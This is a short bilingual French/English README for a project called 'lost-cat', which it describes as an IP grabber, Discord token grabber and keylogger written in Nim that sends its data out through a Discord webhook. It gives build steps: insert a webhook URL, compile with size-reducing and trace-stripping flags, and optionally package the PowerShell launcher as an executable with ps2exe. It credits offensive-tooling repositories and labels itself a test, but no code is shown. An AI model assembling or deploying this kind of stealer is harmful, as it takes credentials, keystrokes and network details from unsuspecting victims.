# chat-perdu\lost-cat

![image](https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Cat03.jpg/1200px-Cat03.jpg | width=50)

### 🇫🇷 un chat s'est perdu sur votre ordinateur...

un ip grabber + token grabber + keylogger via un discord webhook, fait en nim
(cela est un test et utilise du code de [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/keylogger_bin.nim) et [NimGrabber](https://github.com/NullCode1337/NimGrabber/blob/main/grabber.nim)

prérequis:
  - [nim 1.6.10](https://nim-lang.org/)
  - (optionelle) [ps2exe](https://github.com/MScholtes/PS2EXE)
  
étapes à suivre:
  - éditez le fichier webhook.nim avec l'url de votre webhook discord
  - compiler logs.nim et webhook.nim en utilisant les commandes suivantes : nim c --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --gc:none logs.nim, et : nim c --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --gc:none webhook.nim
  - (optionelle) convertir le fichier powershell en executable en utilisant ps2exe en utilisant cette commande : Invoke-ps2exe .\main.ps1 .\main.exe, ou : Win-PS2EXE, si vous souhaitez une interface gui 

### 🇬🇧 a cat got lost on your computer...

an ip grabber + token grabber + keylogger via a webhook discord, done in nim
(this is a test and uses code from [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/keylogger_bin.nim) and [NimGrabber](https://github.com/NullCode1337/NimGrabber/blob/main/grabber.nim)

prerequisite:
  - [nim 1.6.10](https://nim-lang.org/)
  - (optional) [ps2exe](https://github.com/MScholtes/PS2EXE)
  
steps to follow:
  - edit the webhook.nim file with the url of your webhook discord
  - compile logs.nim and webhook.nim using the following commands: nim c --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --gc:none logs.nim, and: nim c --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --gc:none webhook.nim
  - (optional) convert the powershell file to executable using ps2exe using this command: Invoke-ps2exe .\main.ps1 .\main.exe, or: Win-PS2EXE, if you want a gui interface 
